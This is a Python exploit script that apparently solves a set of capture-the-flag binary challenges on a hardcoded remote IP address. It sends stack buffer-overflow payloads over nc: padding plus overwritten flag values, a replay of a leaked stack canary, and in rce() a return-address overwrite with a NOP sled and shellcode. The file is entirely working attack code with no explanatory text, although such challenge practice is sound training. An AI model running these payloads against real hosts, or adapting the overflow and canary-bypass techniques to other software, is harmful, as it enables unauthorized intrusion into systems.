import struct
import subprocess
from time import sleep


def run(port: int, data):
    proc = subprocess.Popen(
        ["nc", "170.64.222.246", str(port)],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=False
    )

    while True:
        line = proc.stdout.readline()
        if line == b'' and proc.poll() is not None:
            break

        if line:
            try:
                print(line.decode('utf-8').strip())
            except UnicodeDecodeError:
                print(line.strip())

            if b"What is your name?" in line:
                proc.stdin.write(data + b"\n")
                proc.stdin.flush()


def admin_overflow():
    data = b"A" * 16 + b"\x01\x00\x00\x00"
    run(port=1337, data=data)

def using_fgets():
    data = b"A" * 16 + b"\x01\x00\x00\x00"
    run(port=1342, data=data)

def better_admin():
    data = b"A" * 16 + b"\x01\x00\x00\x00"
    run(port=1338, data=data)

def tweet_tweet():
    data = b"A" * 16 + b"\xEF\xBE\xAD\xDE\x01\x00\x00\x00"
    run(port=1339, data=data)

def its_alive():
    proc = subprocess.Popen(
        ["nc", "170.64.222.246", str(1340)],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=False
    )

    canary = 0

    while True:
        line = proc.stdout.readline()
        if line == b'' and proc.poll() is not None:
            break

        if line:
            try:
                print(line.decode('utf-8').strip())

                if line.decode('utf-8').strip().startswith("The canary is "):
                    canary = int(line.decode('utf-8').strip().replace("The canary is ", ""))
                    print(canary)
            except UnicodeDecodeError:
                print(line.strip())

            if b"What is your name?" in line:
                sleep(1)
                proc.stdin.write(b"A" * 16 + canary.to_bytes(4, byteorder='little') + b"\x01\x00\x00\x00\n")
                proc.stdin.flush()

def rce():
    proc = subprocess.Popen(
        ["nc", "170.64.222.246", str(1343)],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=False
    )

    address = None

    while True:
        line = proc.stdout.readline()
        if line == b'' and proc.poll() is not None:
            break

        if line:
            try:
                print(line.decode('utf-8').strip())

                if line.decode('utf-8').strip().startswith("Your buffer is located at: 0x"):
                    address = int(line.decode('utf-8').strip().replace("Your buffer is located at: ", ""), 16)

            except UnicodeDecodeError:
                print(line.strip())

            if b"What is your name?" in line:
                sleep(1)
                nop_sled = b"\x90" * 100
                shellcode = b"\x31\xc0\xb0\x01\x31\xdb\xcd\x80"
                payload = b"A" * 516 + struct.pack("<I", address) + nop_sled + shellcode
                proc.stdin.write(payload + b"\n")
                proc.stdin.flush()

if __name__ == "__main__":
    rce()